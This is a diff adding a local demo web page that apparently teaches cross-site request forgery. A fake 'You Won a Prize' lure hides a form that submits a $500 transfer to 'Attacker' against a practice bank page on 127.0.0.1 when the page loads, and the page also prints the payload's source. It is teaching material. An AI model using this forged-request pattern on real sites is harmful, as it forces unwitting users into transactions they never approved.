@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>You Won a Prize! 🎉</title>
+    <style>
+        body { font-family: sans-serif; padding: 40px; text-align: center; background: #fff8e1; }
+        h1 { color: #e65100; font-size: 2.5em; }
+        .bait { background: #fff; border: 2px solid #ffa000; padding: 20px; border-radius: 10px; max-width: 500px; margin: 20px auto; }
+        .source-reveal { background: #111; color: #0f0; padding: 15px; text-align: left; font-family: monospace; font-size: 13px; border-radius: 6px; margin-top: 30px; max-width: 700px; margin-left: auto; margin-right: auto; white-space: pre; }
+        .label { display: inline-block; background: #c62828; color: white; padding: 3px 10px; border-radius: 4px; font-size: 13px; }
+    </style>
+</head>
+<body>
+
+    <h1>Congratulations! You Won!</h1>
+
+    <div class="bait">
+        <p style="font-size:1.2em">Click below to claim your <strong>$500 prize</strong>!</p>
+        <p style="color:#888; font-size:13px">Loading your reward...</p>
+        <!-- The real payload is the hidden form below, not this button -->
+    </div>
+
+    <!--
+        HIDDEN ATTACK PAYLOAD
+        The victim never sees this. It auto-submits when the page loads.
+        The browser will attach the victim's bank.html session cookie automatically
+        because the request goes to the same origin (127.0.0.1:5500).
+    -->
+    <form id="csrfForm" action="http://127.0.0.1:5500/CSRF/bank.html" method="GET" style="display:none">
+        <input type="hidden" name="to" value="Attacker">
+        <input type="hidden" name="amount" value="500">
+        <input type="hidden" name="forged" value="1">
+    </form>
+
+    <div class="source-reveal">
+<span style="color:#ffa">&lt;!-- Hidden CSRF payload (victim never sees this) --&gt;</span>
+&lt;form id="csrfForm"
+      action="http://127.0.0.1:5500/CSRF/bank.html"
+      method="GET"
+      <span style="color:red">style="display:none"</span>&gt;
+  &lt;input type="hidden" name="to"     value="<span style="color:#f88">Attacker</span>"&gt;
+  &lt;input type="hidden" name="amount" value="<span style="color:#f88">500</span>"&gt;
+  &lt;input type="hidden" name="forged" value="1"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrfForm').submit();&lt;/script&gt;
+
+<span style="color:#aaa">// Browser auto-attaches Alice's session cookie on this request.
+// bank.html trusts the cookie → transfer goes through.</span>
+    </div>
+
+    <script>
+        // Auto-submit after short delay so victim sees the bait page briefly
+        setTimeout(() => {
+            document.getElementById('csrfForm').submit();
+        }, 1500);
+    </script>
+
+</body>
+</html>
